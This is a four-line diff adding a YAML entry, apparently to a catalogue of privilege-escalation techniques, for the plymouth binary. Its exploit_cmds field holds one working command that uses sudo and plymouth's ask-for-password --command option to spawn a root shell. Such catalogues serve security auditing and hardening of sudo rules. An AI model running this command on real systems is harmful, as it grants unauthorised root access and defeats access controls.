@@ -1,0 +1,4 @@
+name: plymouth
+binary_path: /usr/bin/plymouth
+exploit_cmds:
+- sudo /usr/bin/plymouth ask-for-password --prompt=x --command=/bin/sh
